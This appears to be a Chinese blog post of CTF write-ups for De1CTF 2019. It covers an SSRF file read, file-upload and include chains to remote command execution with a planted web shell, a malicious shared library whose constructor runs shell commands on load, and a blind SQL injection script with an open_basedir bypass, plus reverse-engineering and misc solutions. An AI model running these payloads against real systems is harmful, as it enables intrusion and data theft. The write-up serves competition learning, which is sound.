---
title: De1ctf 2019 writeup
date: 2019-08-09 00:04:01
tags: writeup
---

**目录**
<!-- toc -->
## 前言

最近在华为实习，跟部门的两位不怎么打CTF，但是现在想打CTF的前辈们一起打了这次的De1CTF，我主要负责WEB。这次WEB感觉还是比较防水，做出了两道题WEB和一道MISC，排名在60，以前的XCTF的WEB题都不是人做的。所以这次还是涨了点信心,定个小目标，明年XCTF总决赛吃热干面。

**目录**
<!-- toc -->

## WEB
### SSRF Me 
可以使用哈希扩展攻击更改action为read(误)
更简单的是在params后面加个read,然后提交action为readscan，就可以绕过这个的cookie的检查并且可以读出文件，这题关键在于urlopen对于读取文件有另外的特殊方式
<!-- more -->
![](https://hackmd.summershrimp.com/uploads/upload_efafb2587d05e81dbfda08eb961b5b39.jpg)

```python
# coding= utf-8

import requests


cookie = 'action=readscan; sign={}'

base_url = 'http://139.180.128.86/{}?param={}'


try:
    sign = ''
    # /proc/self/cwd代表当前位置
    param1 = 'local-file:///proc/self/cwd/flag.txtread'
    sign_url = base_url.format('geneSign', param1)
    print(sign_url)
    sign = requests.get(sign_url).content
    De1ta_url = base_url.format('De1ta', 'local-file:///proc/self/cwd/flag.txt')
    print(De1ta_url)
    cookie1 = cookie.format(sign)
    headers = {"Cookie": cookie1}
    res = requests.get(De1ta_url, headers=headers).content
    print(res)
except Exception as e:
    print(e)

```
de1ctf{27782fcffbb7d00309a93bc49b74ca26}

### shell
题目提示源码泄露，恢复得到
```php
<?php

require_once 'user.php';
$C = new Customer();
if(isset($_GET['action']))
{
    $action=$_GET['action'];
    $allow=0;
    $white_action = "delete|index|login|logout|phpinfo|profile|publish|register";
    $vpattern = explode("|",$white_action);
    foreach($vpattern as $key=>$value)
    {
        if(preg_match("/$value/i", $action ) &&  (!preg_match("/\//i",$action))   )
        {
            $allow=1;
        }
    }
    if($allow==1)
    {require_once 'views/'.$_GET['action'];}
    else {
        die("Get out hacker!<br>jaivy's laji waf.");
    }
}
else
header('Location: index.php?action=login');

```
第一关参考
https://www.xmsec.cc/n1ctf-web-review/
https://xz.aliyun.com/t/2148#toc-0
然后直接上传得shell
shell: http://123.207.72.148:11027/upload/wula.php password是cmd
进去看exp3.php(前人种树后人乘凉滑稽)，对内网.2的ip进行文件上传包含可以执行命令。

```php
<?php



$payload="curl -i -s -k  -X 'POST'  -H 'Upgrade-Insecure-Requests: 1' -H 'Origin: null' -H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymZPeYQvY7ydrgDSx' -H 'User-Agent: Mo'  --data-binary $'------WebKitFormBoundarymZPeYQvY7ydrgDSx\x0d\x0aContent-Disposition: form-data; name=\"file[0]\"\x0d\x0a\x0d\x0a0\x0d\x0a------WebKitFormBoundarymZPeYQvY7ydrgDSx\x0d\x0aContent-Disposition: form-data; name=\"file[2]\"\x0d\x0a\x0d\x0aphp\x0d\x0a------WebKitFormBoundarymZPeYQvY7ydrgDSx\x0d\x0aContent-Disposition: form-data; name=\"hello\"\x0d\x0a\x0d\x0a/var/sandbox/c45f7f6a79cd05675f81154be24040c5/500.php\x0d\x0a------WebKitFormBoundarymZPeYQvY7ydrgDSx\x0d\x0aContent-Disposition: form-data; name=\"file\"; filename=\"l3yxxxxxxxxx.php\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a@<?php echo 6666;?>\x0d\x0a------WebKitFormBoundarymZPeYQvY7ydrgDSx--\x0d\x0a'      'http://172.18.0.2/index.php'";
	for($i=100;$i<200;$i++){
		system($payload);
	}

	for($i=100;$i<200;$i++){
		$j=(string)$i;
		system("curl -i -s -k  -X 'POST'  -H 'Upgrade-Insecure-Requests: 1' -H 'Origin: null' -H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymZPeYQvY7ydrgDSx' -H 'User-Agent: Mo'  --data-binary $'------WebKitFormBoundarymZPeYQvY7ydrgDSx\x0d\x0aContent-Disposition: form-data; name=\"file[0]\"\x0d\x0a\x0d\x0a0\x0d\x0a------WebKitFormBoundarymZPeYQvY7ydrgDSx\x0d\x0aContent-Disposition: form-data; name=\"file[2]\"\x0d\x0a\x0d\x0aphp/.\x0d\x0a------WebKitFormBoundarymZPeYQvY7ydrgDSx\x0d\x0aContent-Disposition: form-data; name=\"hello\"\x0d\x0a\x0d\x0a/var/sandbox/c45f7f6a79cd05675f81154be24040c5/$j.php\x0d\x0a------WebKitFormBoundarymZPeYQvY7ydrgDSx\x0d\x0aContent-Disposition: form-data; name=\"file\"; filename=\"l3yxxxxxxxxx.php\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a@<?php echo 1234569;system(\"cat /etc/flag_is_He4e_89587236.txt\");?>\x0d\x0a------WebKitFormBoundarymZPeYQvY7ydrgDSx--\x0d\x0a'      'http://172.18.0.2/index.php?0=$_GET[0]'");

	} 
```
访问这个PHP即可得到flag


### cloudmusic_rev
国赛决赛第一版，G师傅牛批嗷
https://github.com/impakho/ciscn2019_final_web1
读源码发现提示
> urldecode path:php://filter/convert.base64-encode/resource=share.php
.php is not allowed.
那么.php转个urlencode，%2ephp

验证码就不展开谈，来详细谈下作为一个WEB狗搞二进制的收获。

事实上一开始看writeup，发现自己连mp3都传不上。。。接下来来分析一下为什么传不上。

我们先来看mp3的[文件结构](https://blog.csdn.net/u010650845/article/details/53520426)，这里本题相关的就是

> 位于文件开始处，长度为10字节，结构如下：
>
> char Header[3];    /*必须为“ID3”否则认为标签不存在*/
>
> TIT2=标题
>
> TPE1=作者
>
> TALB=专集

先看upload的重点逻辑

```php
$flags = fread($handle, 3);
            fclose($handle);
            if ($flags!=="ID3"){
                unlink($music_filename);
                ob_end_clean();
                die(json_encode(array('status'=>0,'info'=>'upload err, not a valid MP3 file.')));
            }
```

很明显，就是判断前三位是不是ID3

```php
 try{
		$parser = FFI::cdef("
            struct Frame{
            char * data;
            int size;
         };
		struct Frame * parse(char * password, char * classname, char * filename);
		", __DIR__ ."/../lib/parser.so");

		$result=$parser->parse($_GLOBALS['admin_password'],"title",$music_filename);
		if ($result->size>0x60) 
        $result->size=0x60;

        $mp3_title=(string) FFI::string($result->data,$result->size);
     	$mp3_artist=...
        $mp3_album=...
 }catch(Error $e){
        ob_end_clean();
        die(json_encode(array('status'=>0,'info'=>'upload err, not a valid MP3 file.')));
            }
```

所以看到这里，就可以大概猜想出为啥，在解析的时候报错了，现在回看，我上传的mp3是少了title、artist或者album。

现在来分析.so文件，正常IDA打开就可以看到源码。

先看PHP中的结构体定义和调用parse调用原型

```c
struct Frame{
		char * data;
        int size;
};
struct Frame * parse(char * password, char * classname, char * filename);
                ", __DIR__ ."/../lib/parser.so");
```

然后看parse定义,为了方便，我将变量语义化了

```c
void *__fastcall parse(__int64 password_addr, const char *class_name, __int64 filename)
{
  __int64 v4; // [rsp+8h] [rbp-18h]

  v4 = filename;
  init_proc();
  if ( (unsigned int)check_password(password_addr) == 1 )
  {
    if ( !strcmp(class_name, "title") )
    {
      read_title(v4);
    }
    else if ( !strcmp(class_name, "artist") )
    {
      read_artist(v4);
    }
    else if ( !strcmp(class_name, "album") )
    {
      read_album(v4, "album");
    }
  }
  return &mframe_data;
}
```

parse的逻辑直接，根据class_name来选择是调用哪个函数,接下来跟进一个read_title就可以了，其它基本一致。

```c
unsigned __int64 __fastcall read_title(__int64 filename)
{
  unsigned __int64 result; // rax
  const char *v2; // rax
  signed int *v3; // rax
  signed int *v4; // [rsp+18h] [rbp-18h]
  // 应该是加载文件内容
  result = load_tag(filename);
  if ( result )
  {
    // 从内容读取TIT2
    v2 = tag_get_title(result);
    // 读取TIT2后面对应的内容
    v3 = parse_text_frame_content((__int64)v2);
    v4 = v3;
    // 计算真实data长度
    result = strlen(*((const char **)v3 + 1));
    if ( result <= 0x70 )
    {
      mframe_size = strlen(*((const char **)v4 + 1));
      // 漏洞出现点
      result = (unsigned __int64)strcpy((char *)&mem_mframe_data, *((const char **)v4 + 1));
    }
  }
  return result;
}
```

```c
const char *__fastcall tag_get_title(__int64 a1)
{
  const char *result; // rax

  if ( a1 )
    // TIT2标识
    result = get_from_list(*(_QWORD *)(a1 + 16), (__int64)"TIT2");
  else
    result = 0LL;
  return result;
}
```

接下来看，mem_mframe_data的数据分布是如何的，双击点进去。

![](https://wulasite.top/mdimage/de1ctf/m_mframe_data.png)

![1565108231135](https://wulasite.top/mdimage/de1ctf/mframe_data.png)

事实上，mem_frame_data正好70个字节，如果在拷贝的时候出现了off by null，覆盖了mframe_data，就会出现意外情况，啥意外情况？让我们看看mframe_data的调用。

```c
void *init_proc()
{
  mframe_size = 0;
  mframe_data = &mem_mframe_data;
  memset(&mem_mframe_data, 0, 0x70uLL);
  passwd = &mem_mpasswd;
  return memset(&mem_mpasswd, 0, 0x20uLL);
}
```

mframe_data存的是mem_mframe_data的指针，也就是9320嗷，如果正好是70个字节满的，拷贝过来的时候就会覆盖成9300,那么9300是啥呢。

![](https://wulasite.top/mdimage/de1ctf/mem_password.png)

是日思夜思的password的啊。这样parser返回的mem_mframe_data就从password开始了。

接下来构造一个这样的mp3

```python
// python2
from base64 import b64decode

preset_music = b64decode('SUQzBAAAAAABBFRSQ0sAAAADAAADMQBUSVQyAAAAEgAAA2JiYmJiYmJiYmJiYmJiYmIAVEFMQgAAABIAAANjY2NjY2NjY2NjY2NjY2NjAFRQRTEAAAASAAADYWFhYWFhYWFhYWFhYWFhYQA=')


# upload music [diff]
def upload_music():
    music = preset_music[:0x6] + '\x00\x00\x03\x00' + preset_music[0x0a:0x53]
    music += '\x00\x00\x03\x00' + '\x00\x00\x03' + 'a' * 0x70 + '\x00'
    with open('1.mp3', 'wb') as f:
        f.write(music)


upload_music()

```

![](https://wulasite.top/mdimage/de1ctf/mp3.png)

70个字节+\00，正好off by one(null)。接下来上传就可以看到admin密码了

![](https://wulasite.top/mdimage/de1ctf/admin_password.png)

然后访问#firmware

接下来审计一下firmware.php的源码，提取关键信息。

1. elf文件名是（伪）随机生成的

	```php
	mt_srand(time());
	$firmware_filename=md5(mt_rand().$_SERVER['REMOTE_ADDR']);    						
	$firmware_filename=__DIR__."/../uploads/firmware/".$firmware_filename.".elf";
	```

2. 会加载elf文件执行代码读取版本，等等，执行代码？

   ```php
   $elf = FFI::cdef("
   	extern char * version;
   	", $firmware_filename);
   $version=(string) FFI::string($elf->version);
   ```

   有个陌生的FFI:cdef是干啥的

   ```php
   public static FFI::cdef ([ string $code = "" [, string $lib ]] ) : FFI
   Creates a new FFI object.
   
   Parameters 
   code
   A string containing a sequence of declarations in regular C language (types, structures, functions, variables, etc). Actually, this string may be copy-pasted from C header files.
   
   lib
   The name of a shared library file, to be loaded and linked with the definitions.
   动态库文件名，它会被加载到内存中去
   ```

   被加载，就有被执行的可能，对吧。

   恰巧[\_\_attribute\_\_](https://www.jianshu.com/p/e2dfccc32c80) 它就提供了一个函数属性叫(constructor/destructor),在主函数开始之前/结束之后执行。所以就算没有主函数，他们也会被执行。emmmmmmmmmmmm，好像很有道理的样子。
   
   然后这里也没有回显，取代做法有很多种，比如写入/uploads/firmware目录下，或者用curl把信息带到自己的服务器或者xss平台上。
   
   放payload
   
   ```c
   #include <stdio.h>
   #include <string.h>
   
   char _version[0x130];
   char * version = &_version;
   
   __attribute__ ((constructor)) void fun(){
       memset(version,0,0x130);
       FILE * fp=popen("/usr/bin/tac /flag > /var/www/html/uploads/firmware/wulasite.txt", "r");
       if (fp==NULL) return;
       fread(version, 1, 0x100, fp);
       pclose(fp);
   }
   ```
   
   然后使用
   
   > gcc -shared -fPIC -o test.so test.c 
   
   生成.so文件，然后上传。然后从响应头得到脚本运行时间，然后破解
   
   ```php
   <?php
   
       echo time();
       echo '<br>';
       $ip = "你的公网IP";
       $time = strtotime('Thu, 08 Aug 2019 13:57:11 GMT');
       mt_srand($time);
       echo md5(mt_rand().$ip);
       echo '<br>';
       echo time();
   ```
   
   就可以拿输出的md5值提交调试，就可以执行.so了
   
   ![](https://wulasite.top/mdimage/de1ctf/firmware.png)
   
   
   
   可以看到返回了Bad version，但这并不重要。现在去uploads/firmware/里查看一下wulasite.txt即可得到flag。
   
   **思考**：
   
   这个响应头返回的时间到底是啥时间？
   
   根据下面脚本的实验，对比脚本一开始输出的时间和sleep(5)后的时间发现，是脚本一开始执行的时间，所以就是如果上传的时间不超过1s，就可以根据返回的时间直接得出文件名，否则要在一定秒数内猜解。
   
   ```php
   <?php
   
       echo time();
       echo '<br>';
   	sleep(5);
       echo time();
   ```
   
   当然，除了直接写文件外，还可以用curl发送到自己的服务器上或者xss平台上，弹shell。
   
   
### giftbox

这题比想象中的简单，只是没想到是SQL注入，主要是这个命令带参数的时候，会把空格解析成参数，所以一时没想法，也跟当时做题时间比较晚，第二天还要上班，真实社畜了。

这题切入点还是SQL注入，而且是没有任何过滤的，所以直接注出admin的密码就行，设置的障碍点就是一个TOTP的认证。所以当观察发包的时候看到这个totp参数，肯定要去找js代码，可以找得到。做过爬虫的其实都知道，这是一个非常基本的反扒策略，我做过抖音的视频爬虫，它的接口也要求带一个跟当前时间有关的参数，但是具体算法需要你一步一步debug，然后还有混淆，真是艰难。这题就很简单了，就是直接告诉你用的totp，访问/js目录还可以看到totp的python安装包。

直接放writeup的脚本吧，注入就是经典的二分法了，后面遇到的是open_basedir的绕过，可以参考[这篇文章](https://xz.aliyun.com/t/4720)

```python
import requests
import urllib
import string
import pyotp

url = 'http://207.148.79.106:8090/shell.php?a=%s&totp=%s'
totp = pyotp.TOTP("GAXG24JTMZXGKZBU", digits=8, interval=5)
s = requests.session()

length = 0
left = 0x0
right = 0xff

def get_password():
    while True:
        mid = int((right - left) / 2 + left)
        if mid == left:
            length = mid
            break
        username = "'/**/or/**/if(length((select/**/password/**/from/**/users/**/limit/**/1))>=%d,1,0)#" % mid
        password = "b"
        payload = 'login %s %s' % (username, password)
        payload = urllib.quote(payload)
        payload = url % (payload, totp.now())
        res = s.get(payload).text
        if 'incorrect' in res:
            left = mid
        else:
            right = mid
    print(length)

    real_password = ''
    for i in range(1, length + 1):
        left = 0x20
        right = 0x7e
        while True:
            mid = int((right - left) / 2 + left)
            if mid == left:
                real_password += chr(mid)
                break
            username = "'/**/or/**/if(ascii(substr((select/**/password/**/from/**/users/**/limit/**/1),%d,1))>=%d,1,0)#" % (
            i, mid)
            password = "b"
            payload = 'login %s %s' % (username, password)
            payload = urllib.quote(payload)
            payload = url % (payload, totp.now())
            res = s.get(payload).text
            if 'incorrect' in res:
                left = mid
            else:
                right = mid
        print(real_password)
        if len(real_password) < i:
            print('No.%d char not in range' % i)
            break


def login(password):
    username = 'admin'
    payload = 'login %s %s' % (username, password)
    payload = urllib.quote(payload)
    payload = url % (payload, totp.now())
    s.get(payload)


def destruct():
    payload = 'destruct'
    payload = urllib.quote(payload)
    payload = url % (payload, totp.now())
    s.get(payload)


def targeting(code, position):
    payload = 'targeting %s %s' % (code, position)
    payload = urllib.quote(payload)
    payload = url % (payload, totp.now())
    s.get(payload)


def launch():
    payload = 'launch'
    payload = urllib.quote(payload)
    payload = url % (payload, totp.now())
    return s.get(payload).text


login('hint{G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333}')
destruct()
targeting('a', 'chr')
targeting('b', '{$a(46)}')
targeting('c', '{$b}{$b}')
targeting('d', '{$a(47)}')
targeting('e', 'js')
targeting('f', 'open_basedir')
targeting('g', 'chdir')
targeting('h', 'ini_set')
targeting('i', 'file_get_')
targeting('j', '{$i}contents')
targeting('k', '{$g($e)}')
targeting('l', '{$h($f,$c)}')
targeting('m', '{$g($c)}')
targeting('n', '{$h($f,$d)}')
targeting('o', '{$d}flag')
targeting('p', '{$j($o)}')
targeting('q', 'printf')
targeting('r', '{$q($p)}')
print(launch())

```
   



## PWN

## REVERSE
re_sign[lichangjun]
先脱壳，下断点到
00435A36 | 8D4424 80                | lea eax,dword ptr ss:[esp-80]           |
00435A3A | 6A 00                    | push 0                                  |
00435A3C | 39C4                     | cmp esp,eax                             |
00435A3E | 75 FA                    | jne re_sign.435A3A                      |
00435A40 | 83EC 80                  | sub esp,FFFFFF80                        |
00435A43 | E9 CAF5FCFF              | jmp re_sign.405012                      |
最后一条jmp语句执行完成后就可脱壳了，但是不知道怎么修复使其运行，放IDA中基本能看，结合ollydbg调试、
先在ollydbg中跟踪到输入函数在 sub_401000函数中，查看字符串可以看到success字符串也在这个函数中，所以把这个函数分析清楚就足够了，下面就是这个函数的IDA截图
![](https://hackmd.summershrimp.com/uploads/upload_3cede4820724da0bb81d95bd652b05cb.png)
其中几个调用函数都是超级变态长，实力有限，干通过IDA看实在看不动，只能边调试连跟踪输入字符串边对照IDA，主要分析清楚2个函数：
1）函数sub_401233：实现输入字符串的base64操作，但其常量字符串为'0123456789QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm+/'
2）函数sub_401F0A：实现对base64之后的字符串在另一个常量字符串"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
中查找各字符的index+1,然后与0x41e3c9+2之后的48个数字进行比较，完全相等即为通过
python逆向代码：
def decode_b1():
    s = [0x08, 0x3B, 0x01, 0x20, 0x07, 0x34, 0x09, 0x1F, 0x18, 0x24, 0x13, 0x03, 0x10, 0x38, 0x09, 0x1B, 0x08, 0x34, 0x13, 0x02, 0x08, 0x22, 0x12, 0x03, 0x05, 0x06, 0x12, 0x03, 0x0F, 0x22, 0x12, 0x17, 0x08, 0x01, 0x29, 0x22, 0x06, 0x24, 0x32, 0x24, 0x0F, 0x1F, 0x2B, 0x24, 0x03, 0x15, 0x41, 0x41]
    b = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
    r = ''
    for i in range(48):
        r += b[s[i]-1]
    return r

def decode_b2(s):
    a = '0123456789QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm+/'
    r = ''
    for i in range(0, len(s), 4):
        p1 = a.find(s[i])
        p2 = a.find(s[i + 1])
        p3 = a.find(s[i + 2])
        p4 = a.find(s[i + 3])
        r += chr((p1<<2) | ((p2>>4)&0x3))
        r += chr(((p2&0xf)<<4) |  ((p3>>2)&0xf))
        r += chr(((p3 & 0x3) << 6) | (p4 & 0x3f))
    return r


print decode_b2(decode_b1())






## MISC
### MineSweep
unity3d扫雷游戏，dnSpy反编译Assembly-Csharp.dll
![](https://hackmd.summershrimp.com/uploads/upload_698aa85b9b3f995c5be448f5ff7f1dcb.png)
修改IL指令，将踩雷游戏结束逻辑改一下，然后游戏可以一直点（或者也可以再改多一点，直接游戏胜利）
![](https://hackmd.summershrimp.com/uploads/upload_7124d61da58623c8ad7b9da317dc35b9.png)
最后扫雷完成的图片可以转化成二维码，扫描可得flag信息
![](https://hackmd.summershrimp.com/uploads/upload_512ae93f2c86e300c9861a3919777e84.png)
扫描可得flag
de1ctf{G3t_F1@g_AFt3R_Sw3ep1ng_M1n3s}



